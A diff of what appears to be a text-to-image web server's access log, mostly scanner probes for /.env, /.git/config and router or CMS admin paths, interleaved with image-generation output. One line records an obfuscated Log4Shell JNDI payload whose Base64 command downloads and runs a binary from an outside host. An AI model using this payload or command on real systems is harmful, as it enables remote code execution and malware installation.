@@ -431,3 +431,294 @@ INFO:     127.0.0.1:57554 - "GET / HTTP/1.0" 404 Not Found
 INFO:     127.0.0.1:37700 - "GET / HTTP/1.0" 404 Not Found
 INFO:     127.0.0.1:34156 - "GET /ip.php?Z77824206831Q1 HTTP/1.0" 404 Not Found
 INFO:     127.0.0.1:44472 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56782 - "GET /sugar_version.json HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:57072 - "GET /systembc/password.php HTTP/1.0" 404 Not Found
+INFO:     45.56.108.128:0 - "GET /kV8c HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56684 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:46650 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36158 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35538 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:33384 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:39150 - "GET / HTTP/1.0" 404 Not Found
+INFO:     47.107.48.184:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:42312 - "GET / HTTP/1.0" 404 Not Found
+INFO:     45.79.181.179:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:55170 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:58130 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:58132 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:41588 - "GET / HTTP/1.0" 404 Not Found
+INFO:     161.35.233.14:0 - "GET /explore HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:39840 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:50646 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:37470 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:41880 - "GET / HTTP/1.0" 404 Not Found
+INFO:     47.107.48.184:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:52282 - "HEAD / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:49622 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:49624 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:49626 - "GET /english/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:49628 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:49632 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:39232 - "GET / HTTP/1.0" 404 Not Found
+INFO:     101.36.97.125:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     101.36.97.125:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     101.36.97.125:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     101.36.97.125:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:50750 - "GET /actuator/health HTTP/1.0" 404 Not Found
+INFO:     159.65.180.172:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     159.65.180.172:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40772 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:42794 - "GET /hudson HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:54538 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:41494 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:59466 - "HEAD /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34420 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:48672 - "POST /index.htm HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:48674 - "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:37538 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:37540 - "GET /index.htm HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:37542 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:43092 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:44044 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56132 - "POST /CGI/Execute HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56134 - "GET /admin/config.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:51488 - "GET /CGI/Execute HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35574 - "GET /admin/config.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:57364 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:38550 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:37090 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:45530 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:43422 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:43424 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:57352 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:48336 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34606 - "GET / HTTP/1.0" 404 Not Found
+INFO:     94.102.61.7:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40922 - "GET / HTTP/1.0" 404 Not Found
+INFO:     92.118.39.109:0 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:47768 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:55582 - "GET / HTTP/1.0" 404 Not Found
+INFO:     192.241.210.25:0 - "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:44756 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:49908 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:41138 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:33676 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:39938 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:39940 - "POST / HTTP/1.0" 404 Not Found
+INFO:     64.44.168.137:0 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     64.44.168.137:0 - "POST / HTTP/1.0" 404 Not Found
+INFO:     124.235.138.153:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     121.28.84.80:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//104.248.235.57:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQyLjkzLjI0Mi4xNzcvLmR1Y2svdXBkYXRlciA7IGN1cmwgLU8gaHR0cDovLzE0Mi45My4yNDIuMTc3Ly5kdWNrL3VwZGF0ZXIgOyBjaG1vZCAreCB1cGRhdGVyIDsgY2htb2QgNzc3IHVwZGF0ZXIgOyAuL3VwZGF0ZXIgcnVubmVyIDsgc3VkbyAuL3VwZGF0ZXIgcnVubmVyIDsgcm0gLXJmIHJ1bm5lcg==}'):0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:48942 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:53764 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:53766 - "POST /HNAP1/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34518 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56936 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56938 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56940 - "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56942 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56944 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56946 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56948 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56950 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56952 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56954 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56956 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56958 - "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56960 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56962 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56964 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56966 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56968 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56970 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56972 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:56974 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:50058 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:44680 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:47732 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:59842 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:41786 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:38622 - "HEAD / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:38624 - "GET /dist/images/mask/guide/cn/step1.jpg HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:38626 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:50614 - "GET /dist/images/mask/guide/cn/step1.jpg HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:46202 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:47812 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:50250 - "GET /dist/images/mask/guide/cn/step1.jpg HTTP/1.0" 404 Not Found
+INFO:     45.33.80.243:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36798 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:37922 - "GET /actuator/gateway/routes HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36168 - "GET /Uf2o HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36170 - "GET /p1Gu HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36172 - "GET /aab8 HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36174 - "GET /jquery-3.3.1.slim.min.js HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36176 - "GET /aab9 HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36178 - "GET /jquery-3.3.2.slim.min.js HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:49962 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:41206 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:52904 - "GET /aab9 HTTP/1.0" 404 Not Found
+INFO:     183.136.225.32:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     183.136.225.32:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     183.136.225.32:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     183.136.225.32:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:59286 - "GET /p1Gu HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:38574 - "GET /Uf2o HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:59612 - "GET /aab8 HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:53360 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:38072 - "GET /aab9 HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:39550 - "GET /Uf2o HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:58844 - "GET /p1Gu HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:39316 - "GET /aab8 HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:37978 - "GET / HTTP/1.0" 404 Not Found
+INFO:     71.6.232.26:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40288 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40290 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40292 - "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40294 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40296 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40298 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40300 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40302 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40304 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40306 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40308 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40310 - "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40312 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40314 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40316 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40318 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40320 - "GET /media/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40322 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40324 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40326 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:40328 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:38822 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:46214 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:54640 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35586 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:57520 - "GET / HTTP/1.0" 404 Not Found
+INFO:     64.62.197.66:0 - "GET / HTTP/1.0" 404 Not Found
+***********: Final sequence is 女生打羽毛球,4K壁纸 **********
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:17,  1.35it/s]  8%|▊         | 2/25 [00:01<00:11,  1.99it/s] 12%|█▏        | 3/25 [00:01<00:09,  2.30it/s] 16%|█▌        | 4/25 [00:01<00:08,  2.52it/s] 20%|██        | 5/25 [00:02<00:07,  2.66it/s] 24%|██▍       | 6/25 [00:02<00:06,  2.73it/s] 28%|██▊       | 7/25 [00:02<00:06,  2.80it/s] 32%|███▏      | 8/25 [00:03<00:06,  2.83it/s] 36%|███▌      | 9/25 [00:03<00:05,  2.85it/s] 40%|████      | 10/25 [00:03<00:05,  2.88it/s] 44%|████▍     | 11/25 [00:04<00:04,  2.91it/s] 48%|████▊     | 12/25 [00:04<00:04,  2.91it/s] 52%|█████▏    | 13/25 [00:04<00:04,  2.92it/s] 56%|█████▌    | 14/25 [00:05<00:03,  2.92it/s] 60%|██████    | 15/25 [00:05<00:03,  2.91it/s] 64%|██████▍   | 16/25 [00:05<00:03,  2.92it/s] 68%|██████▊   | 17/25 [00:06<00:02,  2.93it/s] 72%|███████▏  | 18/25 [00:06<00:02,  2.93it/s] 76%|███████▌  | 19/25 [00:06<00:02,  2.94it/s] 80%|████████  | 20/25 [00:07<00:01,  2.93it/s] 84%|████████▍ | 21/25 [00:07<00:01,  2.92it/s] 88%|████████▊ | 22/25 [00:07<00:01,  2.92it/s] 92%|█████████▏| 23/25 [00:08<00:00,  2.94it/s] 96%|█████████▌| 24/25 [00:08<00:00,  2.93it/s]100%|██████████| 25/25 [00:08<00:00,  2.93it/s]100%|██████████| 25/25 [00:08<00:00,  2.80it/s]
+File: /root/magic.image/gen_images/adercboqd19m_女生打羽毛球,4K壁纸.png is saved, done!
+Text2Image Processing is Done!
+INFO:     124.127.27.17:0 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     124.127.27.17:0 - "GET /download?file_path=/root/magic.image/gen_images/adercboqd19m_%E5%A5%B3%E7%94%9F%E6%89%93%E7%BE%BD%E6%AF%9B%E7%90%83,4K%E5%A3%81%E7%BA%B8.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:37962 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:37964 - "GET /humans.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:37966 - "GET /ads.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:37968 - "GET / HTTP/1.0" 404 Not Found
+***********: Final sequence is 小狗打羽毛球,插画 **********
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:18,  1.33it/s]  8%|▊         | 2/25 [00:01<00:11,  1.97it/s] 12%|█▏        | 3/25 [00:01<00:09,  2.29it/s] 16%|█▌        | 4/25 [00:01<00:08,  2.51it/s] 20%|██        | 5/25 [00:02<00:07,  2.65it/s] 24%|██▍       | 6/25 [00:02<00:06,  2.73it/s] 28%|██▊       | 7/25 [00:02<00:06,  2.80it/s] 32%|███▏      | 8/25 [00:03<00:05,  2.84it/s] 36%|███▌      | 9/25 [00:03<00:05,  2.86it/s] 40%|████      | 10/25 [00:03<00:05,  2.88it/s] 44%|████▍     | 11/25 [00:04<00:04,  2.89it/s] 48%|████▊     | 12/25 [00:04<00:04,  2.89it/s] 52%|█████▏    | 13/25 [00:04<00:04,  2.90it/s] 56%|█████▌    | 14/25 [00:05<00:03,  2.90it/s] 60%|██████    | 15/25 [00:05<00:03,  2.90it/s] 64%|██████▍   | 16/25 [00:05<00:03,  2.91it/s] 68%|██████▊   | 17/25 [00:06<00:02,  2.90it/s] 72%|███████▏  | 18/25 [00:06<00:02,  2.90it/s] 76%|███████▌  | 19/25 [00:06<00:02,  2.91it/s] 80%|████████  | 20/25 [00:07<00:01,  2.90it/s] 84%|████████▍ | 21/25 [00:07<00:01,  2.90it/s] 88%|████████▊ | 22/25 [00:07<00:01,  2.91it/s] 92%|█████████▏| 23/25 [00:08<00:00,  2.90it/s] 96%|█████████▌| 24/25 [00:08<00:00,  2.90it/s]100%|██████████| 25/25 [00:08<00:00,  2.91it/s]100%|██████████| 25/25 [00:08<00:00,  2.78it/s]
+File: /root/magic.image/gen_images/msa5vkkj8zs0_小狗打羽毛球,插画.png is saved, done!
+Text2Image Processing is Done!
+INFO:     124.127.27.17:0 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     124.127.27.17:0 - "GET /download?file_path=/root/magic.image/gen_images/msa5vkkj8zs0_%E5%B0%8F%E7%8B%97%E6%89%93%E7%BE%BD%E6%AF%9B%E7%90%83,%E6%8F%92%E7%94%BB.png HTTP/1.0" 200 OK
+***********: Final sequence is 落霞与孤鹜齐飞,秋水共长天一色,插画 **********
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:17,  1.37it/s]  8%|▊         | 2/25 [00:01<00:11,  2.00it/s] 12%|█▏        | 3/25 [00:01<00:09,  2.31it/s] 16%|█▌        | 4/25 [00:01<00:08,  2.53it/s] 20%|██        | 5/25 [00:02<00:07,  2.67it/s] 24%|██▍       | 6/25 [00:02<00:06,  2.75it/s] 28%|██▊       | 7/25 [00:02<00:06,  2.82it/s] 32%|███▏      | 8/25 [00:03<00:05,  2.86it/s] 36%|███▌      | 9/25 [00:03<00:05,  2.88it/s] 40%|████      | 10/25 [00:03<00:05,  2.91it/s] 44%|████▍     | 11/25 [00:04<00:04,  2.92it/s] 48%|████▊     | 12/25 [00:04<00:04,  2.91it/s] 52%|█████▏    | 13/25 [00:04<00:04,  2.92it/s] 56%|█████▌    | 14/25 [00:05<00:03,  2.92it/s] 60%|██████    | 15/25 [00:05<00:03,  2.93it/s] 64%|██████▍   | 16/25 [00:05<00:03,  2.93it/s] 68%|██████▊   | 17/25 [00:06<00:02,  2.92it/s] 72%|███████▏  | 18/25 [00:06<00:02,  2.92it/s] 76%|███████▌  | 19/25 [00:06<00:02,  2.92it/s] 80%|████████  | 20/25 [00:07<00:01,  2.93it/s] 84%|████████▍ | 21/25 [00:07<00:01,  2.93it/s] 88%|████████▊ | 22/25 [00:07<00:01,  2.93it/s] 92%|█████████▏| 23/25 [00:08<00:00,  2.93it/s] 96%|█████████▌| 24/25 [00:08<00:00,  2.92it/s]100%|██████████| 25/25 [00:08<00:00,  2.92it/s]100%|██████████| 25/25 [00:08<00:00,  2.80it/s]
+File: /root/magic.image/gen_images/ci864b3y5nk0_落霞与孤鹜齐飞,秋水共长天一色,插画.png is saved, done!
+Text2Image Processing is Done!
+INFO:     124.127.27.17:0 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     124.127.27.17:0 - "GET /download?file_path=/root/magic.image/gen_images/ci864b3y5nk0_%E8%90%BD%E9%9C%9E%E4%B8%8E%E5%AD%A4%E9%B9%9C%E9%BD%90%E9%A3%9E,%E7%A7%8B%E6%B0%B4%E5%85%B1%E9%95%BF%E5%A4%A9%E4%B8%80%E8%89%B2,%E6%8F%92%E7%94%BB.png HTTP/1.0" 200 OK
+INFO:     107.170.243.9:0 - "GET / HTTP/1.0" 404 Not Found
+***********: Final sequence is 狮子,梵高 **********
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:17,  1.36it/s]  8%|▊         | 2/25 [00:01<00:11,  1.99it/s] 12%|█▏        | 3/25 [00:01<00:09,  2.30it/s] 16%|█▌        | 4/25 [00:01<00:08,  2.53it/s] 20%|██        | 5/25 [00:02<00:07,  2.66it/s] 24%|██▍       | 6/25 [00:02<00:06,  2.73it/s] 28%|██▊       | 7/25 [00:02<00:06,  2.80it/s] 32%|███▏      | 8/25 [00:03<00:05,  2.85it/s] 36%|███▌      | 9/25 [00:03<00:05,  2.87it/s] 40%|████      | 10/25 [00:03<00:05,  2.89it/s] 44%|████▍     | 11/25 [00:04<00:04,  2.89it/s] 48%|████▊     | 12/25 [00:04<00:04,  2.89it/s] 52%|█████▏    | 13/25 [00:04<00:04,  2.91it/s] 56%|█████▌    | 14/25 [00:05<00:03,  2.90it/s] 60%|██████    | 15/25 [00:05<00:03,  2.90it/s] 64%|██████▍   | 16/25 [00:05<00:03,  2.91it/s] 68%|██████▊   | 17/25 [00:06<00:02,  2.91it/s] 72%|███████▏  | 18/25 [00:06<00:02,  2.90it/s] 76%|███████▌  | 19/25 [00:06<00:02,  2.91it/s] 80%|████████  | 20/25 [00:07<00:01,  2.91it/s] 84%|████████▍ | 21/25 [00:07<00:01,  2.91it/s] 88%|████████▊ | 22/25 [00:07<00:01,  2.91it/s] 92%|█████████▏| 23/25 [00:08<00:00,  2.91it/s] 96%|█████████▌| 24/25 [00:08<00:00,  2.90it/s]100%|██████████| 25/25 [00:08<00:00,  2.91it/s]100%|██████████| 25/25 [00:08<00:00,  2.79it/s]
+File: /root/magic.image/gen_images/2jdopswiwtaw_狮子,梵高.png is saved, done!
+Text2Image Processing is Done!
+INFO:     124.127.27.17:0 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     124.127.27.17:0 - "GET /download?file_path=/root/magic.image/gen_images/2jdopswiwtaw_%E7%8B%AE%E5%AD%90,%E6%A2%B5%E9%AB%98.png HTTP/1.0" 200 OK
+***********: Final sequence is 狮子,梵高 **********
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:17,  1.36it/s]  8%|▊         | 2/25 [00:01<00:11,  1.99it/s] 12%|█▏        | 3/25 [00:01<00:09,  2.30it/s] 16%|█▌        | 4/25 [00:01<00:08,  2.53it/s] 20%|██        | 5/25 [00:02<00:07,  2.66it/s] 24%|██▍       | 6/25 [00:02<00:06,  2.72it/s] 28%|██▊       | 7/25 [00:02<00:06,  2.79it/s] 32%|███▏      | 8/25 [00:03<00:06,  2.82it/s] 36%|███▌      | 9/25 [00:03<00:05,  2.84it/s] 40%|████      | 10/25 [00:03<00:05,  2.87it/s] 44%|████▍     | 11/25 [00:04<00:04,  2.87it/s] 48%|████▊     | 12/25 [00:04<00:04,  2.88it/s] 52%|█████▏    | 13/25 [00:04<00:04,  2.89it/s] 56%|█████▌    | 14/25 [00:05<00:03,  2.89it/s] 60%|██████    | 15/25 [00:05<00:03,  2.89it/s] 64%|██████▍   | 16/25 [00:05<00:03,  2.90it/s] 68%|██████▊   | 17/25 [00:06<00:02,  2.90it/s] 72%|███████▏  | 18/25 [00:06<00:02,  2.90it/s] 76%|███████▌  | 19/25 [00:06<00:02,  2.91it/s] 80%|████████  | 20/25 [00:07<00:01,  2.90it/s] 84%|████████▍ | 21/25 [00:07<00:01,  2.90it/s] 88%|████████▊ | 22/25 [00:07<00:01,  2.90it/s] 92%|█████████▏| 23/25 [00:08<00:00,  2.89it/s] 96%|█████████▌| 24/25 [00:08<00:00,  2.90it/s]100%|██████████| 25/25 [00:09<00:00,  2.90it/s]100%|██████████| 25/25 [00:09<00:00,  2.78it/s]
+Potential NSFW content was detected in one or more images. A black image will be returned instead. Try again with a different prompt and/or seed.
+File: /root/magic.image/gen_images/sufeaaxffldd_狮子,梵高.png is saved, done!
+Text2Image Processing is Done!
+INFO:     124.127.27.17:0 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     124.127.27.17:0 - "GET /download?file_path=/root/magic.image/gen_images/sufeaaxffldd_%E7%8B%AE%E5%AD%90,%E6%A2%B5%E9%AB%98.png HTTP/1.0" 200 OK
+***********: Final sequence is 狮子,梵高 **********
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:17,  1.37it/s]  8%|▊         | 2/25 [00:01<00:11,  1.98it/s] 12%|█▏        | 3/25 [00:01<00:09,  2.30it/s] 16%|█▌        | 4/25 [00:01<00:08,  2.52it/s] 20%|██        | 5/25 [00:02<00:07,  2.63it/s] 24%|██▍       | 6/25 [00:02<00:06,  2.72it/s] 28%|██▊       | 7/25 [00:02<00:06,  2.79it/s] 32%|███▏      | 8/25 [00:03<00:06,  2.80it/s] 36%|███▌      | 9/25 [00:03<00:05,  2.83it/s] 40%|████      | 10/25 [00:03<00:05,  2.87it/s] 44%|████▍     | 11/25 [00:04<00:04,  2.86it/s] 48%|████▊     | 12/25 [00:04<00:04,  2.87it/s] 52%|█████▏    | 13/25 [00:04<00:04,  2.89it/s] 56%|█████▌    | 14/25 [00:05<00:03,  2.89it/s] 60%|██████    | 15/25 [00:05<00:03,  2.89it/s] 64%|██████▍   | 16/25 [00:05<00:03,  2.90it/s] 68%|██████▊   | 17/25 [00:06<00:02,  2.90it/s] 72%|███████▏  | 18/25 [00:06<00:02,  2.89it/s] 76%|███████▌  | 19/25 [00:06<00:02,  2.90it/s] 80%|████████  | 20/25 [00:07<00:01,  2.90it/s] 84%|████████▍ | 21/25 [00:07<00:01,  2.90it/s] 88%|████████▊ | 22/25 [00:07<00:01,  2.90it/s] 92%|█████████▏| 23/25 [00:08<00:00,  2.90it/s] 96%|█████████▌| 24/25 [00:08<00:00,  2.89it/s]100%|██████████| 25/25 [00:09<00:00,  2.90it/s]100%|██████████| 25/25 [00:09<00:00,  2.77it/s]
+File: /root/magic.image/gen_images/4n3a604s7ypv_狮子,梵高.png is saved, done!
+Text2Image Processing is Done!
+INFO:     124.127.27.17:0 - "POST /text2image HTTP/1.0" 200 OK
+***********: Final sequence is 狮子,梵高 **********
